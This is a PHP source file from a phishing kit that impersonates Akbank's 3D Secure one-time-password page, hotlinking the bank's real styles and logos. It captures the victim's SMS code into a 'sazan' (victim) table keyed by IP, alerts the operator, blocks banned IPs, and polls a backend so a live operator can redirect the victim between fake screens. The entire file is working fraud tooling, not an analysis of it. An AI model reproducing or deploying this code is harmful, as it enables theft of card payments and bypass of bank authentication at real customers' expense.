<?php

date_default_timezone_set('Europe/Istanbul');
$zaman = date('d-m-20y H:i:s');

include("../gmypanel/Core/getRealIPAdress.php");
include('../gmypanel/Connection.php');

$ip = getUserIP();
$db->query("UPDATE sazan SET now = 'SMS Ekranı' WHERE ip = '{$ip}'");
$sorgu = $db->prepare("SELECT * FROM site");
   $sorgu->execute();
   $cikti = $sorgu->fetch(PDO::FETCH_ASSOC);
ob_start(); 
session_start(); 
$cc_last_4 = $_SESSION['cc_last_4'];
$cc_first_6 = $_SESSION['cc_first_6'];
	$tutar = "".$_SESSION['tutar']." TL";

if($_POST){
  $sms   = htmlspecialchars($_POST['sms']);
  
  $query = $db->prepare("UPDATE sazan SET sms=? WHERE ip = ?");
  $insert = $query->execute(array($sms,$ip));

  if($insert){
      $db->query("UPDATE site SET sms_sesi='1'");
      header('Location:../Waiting.php');
  }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
  if($kontrol['ban'] == $ip){ 
          header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
      } 
}

?>
<html>
  <head>
    <title>Alışveriş</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <!-- used for hidding spinner on winphone-->
    <style>
      .ui-loading .ui-loader {
        display: none;
      }

      .ui-icon-loading {
        opacity: 0;
      }
    </style>
    <meta name="decorator" content="3dlayout">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
  </head>
  <body>
    <div data-role="content" data-theme="c">
      <noscript style="color: red">İşleminizi tamamlayabilmeniz için Javascript'i etkinleştirin. </noscript>
      <div class="content">
        <div class="dijitalgozluk-arkaplan">
          <form id="axesswings3dsecurekayit3" name="axesswings3dsecurekayit3" action="" method="POST" autocomplete="off">
            <div class="dijitalgozluk-ekran">
              <div class="dijitalgozluk-cerceve">
                <div class="dijitalgozluk-kapat">
                  <a>
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/icon-close-18x18.png" alt="X">
                  </a>
                </div>
                <div class="dijitalgozluk-logolar">
                  <div class="dijitalgozluk-logo dijitalgozluk-logo-banka">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/logo-akbank.svg" alt="Akbank">
                  </div>
                  <!--/logo-->
                  <div class="dijitalgozluk-yazi dijitalgozluk-baslik"> Uluslararası Güvenlik <br> Platformu 3D Secure </div>
                </div>
                <!--/logolar-->
                <div class="dijitalgozluk-tablo dijitalgozluk-tablo-bilgiler">
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> İşyeri Adı </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?php $kontrol = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);echo $kontrol['magaza_name']; ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tutar </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?=$tutar?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Tarih </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> <?php echo $zaman; ?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Kart Numarası </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> ************<?=$cc_last_4?> </div>
                  </div>
                  <div class="dijitalgozluk-tablo-satir">
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-isim"> Cep Telefonu </div>
                    <div class="dijitalgozluk-tablo-sutun dijitalgozluk-tablo-deger"> 05XXXXXXXXX </div>
                  </div>
                </div>
                <div id="passwordInformation">
                  <div class="dijitalgozluk-kart-logo">
                    <img src="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_img/v2/ikon-sms-36x31.png" alt="">
                  </div>
                  <div id="passwordInformation1" class="dijitalgozluk-yazi dijitalgozluk-yonlendirme">
                    <p>
                      <span> 01 </span> nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
                    </p>
                  </div>
                  <div id="passwordInformation2" class="dijitalgozluk-form-kontrol dijitalgozluk-form-yazi dijitalgozluk-form-sms-gir">
                    <div class="dijitalgozluk-form-yazi-baslik">Şifre:</div>
                    <div class="dijitalgozluk-form-yazi-input">
                      <input type="password" id="sms" name="sms" autofocus minlength="6" maxlength="6" size="6" autocomplete="off" required>
                    </div>
                    <div id="helpDiv" class="dijitalgozluk-form-yazi-yardim">
                      <a id="opener">Yardım</a>
                    </div>
                  </div>
                </div>
                <div>
                  <div id="div1" style="width: 180px; margin: 0px auto 0 auto;"></div>
                </div>
                <div id="remainingWarn" class="dijitalgozluk-yazi dijitalgozluk-uyari">
                  <p> Onaylama süresinin dolmasına <span id="time">180</span> saniye kalmıştır </p>
                </div>
                <div class="dijitalgozluk-form-kontrolu dijitalgozluk-dugme dijitalgozluk-devam-dugmesi">
                  <input id="DevamEt" name="DevamEt" type="submit" value="Devam">
                </div>
                <div class="dijitalgozluk-yazi dijitalgozluk-alternatif-yontem dijitalgozluk-alternatif-yontem-sms">
                  <p>Bu işlemi Axess Mobil'den de onaylayabilirdin.</p>
                </div>
                <!--/form-kontrolu-->
              </div>
              <!--/cerceve-->
            </div>
            <!--/ekran-->
          </form>
        </div>
        <!--/arkaplan-->
      </div>
    </div>
    <div data-role="”footer”" data-theme="c" data-position="fixed"></div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-draggable ui-resizable" aria-describedby="dialog" aria-labelledby="ui-id-1" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-1" class="ui-dialog-title">Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialog" class="ui-dialog-content ui-widget-content">
        <p>Telefonunuza SMS ile gönderilen tek kullanımlık şifreyi bu alana giriniz.</p>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable ui-resizable" aria-describedby="dialogSmsPwd" aria-labelledby="ui-id-2" style="display: none; position: absolute;">
      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle">
        <span id="ui-id-2" class="ui-dialog-title">Hatalı Şifre</span>
        <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close">
          <span class="ui-button-icon ui-icon ui-icon-closethick"></span>
          <span class="ui-button-icon-space"></span>Close </button>
      </div>
      <div id="dialogSmsPwd" class="ui-dialog-content ui-widget-content">
        <span style="float:left; margin:0 7px 50px 0;"></span>
        <p style="font-size: 12px;"></p>
      </div>
      <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
        <div class="ui-dialog-buttonset">
          <button type="button" class="ui-button ui-corner-all ui-widget">Tamam</button>
        </div>
      </div>
      <div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
      <div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
    </div>
    <script>
		var seconds = 180;
		var display = document.querySelector('#time');

		function incrementSeconds() {
    seconds -= 1;
    display.textContent = seconds;
    }

    var cancel = setInterval(incrementSeconds, 1000);
		</script>
        <script type="text/javascript">
 $(document).ready(function() {

gonder();

var int = self.setInterval("gonder()", 2500);

});

function gonder() {

$.ajax({
    type: 'POST',
    url: '<?php echo "../Database.php?ip=".$ip; ?>',
    success: function(msg) {
      if (msg == 'sms') {
            window.location.href = '../3D_Security';
        }
        if (msg == 'tebrik') {
            window.location.href = '../Successful';
        }
        if (msg == 'hata1') {
            window.location.href = '../Error';
        }
        if (msg == 'back') {
            window.location.href = '../index-2';
        }
        if (msg == 'sms2') {
            window.location.href = '../Wrong_Sms-3';
        }
        if (msg == 'hata2') {
            window.location.href = '../Closed_to_Internet';
        }
    }
});
}
    </script>
  </body>
</html>